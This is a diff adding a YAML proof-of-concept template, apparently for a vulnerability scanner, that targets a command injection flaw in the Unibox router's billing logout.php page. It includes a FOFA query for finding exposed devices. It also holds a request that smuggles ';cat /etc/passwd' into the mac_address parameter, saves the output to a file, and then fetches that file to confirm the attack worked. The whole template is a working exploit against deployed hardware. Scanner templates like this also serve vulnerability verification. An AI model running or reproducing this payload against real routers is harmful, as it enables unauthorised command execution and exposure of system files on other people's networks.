@@ -1,0 +1,19 @@
+id: poc-yaml-unibox-router-logout-php-command-injection
+info:
+  name: Unibox路由器 logout.php 命令注入漏洞
+  severity: critical
+  tags:
+  - 命令注入
+  finger: unibox_administration
+  fofa: body="Unibox" && body="Controller" || body="www.wifi-soft.com"
+variables:
+  t1: random_str(5)
+requests:
+- method: GET
+  path: /billing/logout.php?logout_user=1&mac_address=;cat%20/etc/passwd>{{.t1}}.txt
+  expression: status_code == 200 && contains(body,"Unibox")
+- method: GET
+  path: /billing/{{.t1}}.txt
+  expression: status_code == 200 && contains(body,"root:") && contains(body,"/bin")
+    && !contains(body,"<")
+transport: http
